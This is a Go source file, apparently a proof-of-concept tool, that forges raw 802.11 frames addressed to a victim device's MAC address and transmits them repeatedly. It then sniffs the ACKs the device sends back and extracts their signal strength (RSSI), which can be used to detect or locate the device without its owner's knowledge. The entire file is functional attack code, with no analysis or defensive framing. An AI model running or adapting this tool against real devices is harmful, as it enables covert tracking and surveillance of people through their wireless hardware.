package attack

import (
	"encoding/binary"
	"hash/crc32"
	"strconv"
	"time"
	"log"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

var (
	iface   = "wlo1" // change with the correct name of the card
	snaplen = int32(1600)
	promisc = true
	timeout = -1 * time.Second
	options gopacket.SerializeOptions
)

/**
* Craft the packet and send the attack each time a "true" is sent on the attack channel
*/
func StartAttack(victim_mac []byte, attack chan bool) {
	handle, err := pcap.OpenLive(iface, snaplen, promisc, timeout)

	if err != nil {
		log.Panicln(err)
	}

	defer handle.Close()

	options.ComputeChecksums = true

	// create the packet byte by byte
	dot11 := []byte{
		0x48, 0x00, // type and subtype (No Data) + flags (0)
		0x00, 0x00, // duration
		0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, // receiver, substitute with a real address
		0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, // transmitter
		0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff, // BSSID
		0x20, 0xd5, // sequence number (3410) + fragment number (0)
	}

	// substitute the placeholder receiver address with the victim's one
	for i := 0; i < 6; i++ {
		dot11[i + 4] = victim_mac[i]
	}

	// frame check sequence
	h := crc32.NewIEEE()
	h.Write(dot11)
	crc := make([]byte, 4)
	binary.LittleEndian.PutUint32(crc, h.Sum32())
	nulls := []byte {0x00, 0x00, 0x00, 0x00,}
	for _, b := range crc {
		dot11 = append(dot11, b)
	}
	for _, b := range nulls {
		dot11 = append(dot11, b)
	}

	// add radiotap header to the packet
	outgoingPacket := []byte{0x00, 0x00, 0x19, 0x00, 0x6f, 0x08, 0x00, 0x00, 0x05, 0x5f, 0x60, 0x40, 0x00, 0x00, 0x00, 0x00, 0x10, 0x6c, 0x71, 0x09, 0xc0, 0x00, 0xde, 0x00, 0x01} // radiotap
	for _, b := range dot11 {
		outgoingPacket = append(outgoingPacket, b)
	}

	// wait for the signal to perform the attack
	// if a "true" is received on the attack channel,
	// send the packet, otherwise break
	for {
		if (<-attack) {
			err = handle.WritePacketData(outgoingPacket)
			if err != nil {
				log.Fatal(err)
			}
		} else {
			break
		}
	}
}

/**
* Send "true" on the command channel, each time waiting for a wait time, until a "true"
* is sent on the done channel
*/
func ContinuousAttack(command_channel chan bool, done_channel chan bool, wait_time int) {
	duration, _ := time.ParseDuration(strconv.Itoa(wait_time) + "ms")
	for {
		select {
		case <- done_channel:
			command_channel <- false
			return
		default:
			command_channel <- true
			time.Sleep(duration)
		}
	}

}

/**
* Sniff ACKs that are sent back from the victim machine and send them on the
* ack channel
*/
func CaptureACKs(ack_channel chan gopacket.Packet, attack chan bool) {
	handle, err := pcap.OpenLive(iface, snaplen, promisc, timeout)

	if err != nil {
		log.Panicln(err)
	}

	defer handle.Close()

	// eBPF filter
	filter := "wlan addr1 aa:bb:cc:dd:ee:ff and type ctl and subtype ack"
    err = handle.SetBPFFilter(filter)
    if err != nil {
        log.Fatal(err)
    }

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		ack_channel <- packet
		// if a "false" is sent, just stop the capture
		if (!<-attack) {
			break
		}
	}
}

/**
* Return the RSSI from the RadioTap header of the packet
*/
func GetRSSI(packet gopacket.Packet) string {
	radioTapLayer := packet.Layer(layers.LayerTypeRadioTap)
	if radioTapLayer == nil {
		log.Fatal("Error decoding packet")
	}

	radioTapPacket, _ := radioTapLayer.(*layers.RadioTap)
	return strconv.Itoa(int(radioTapPacket.DBMAntennaSignal))
}
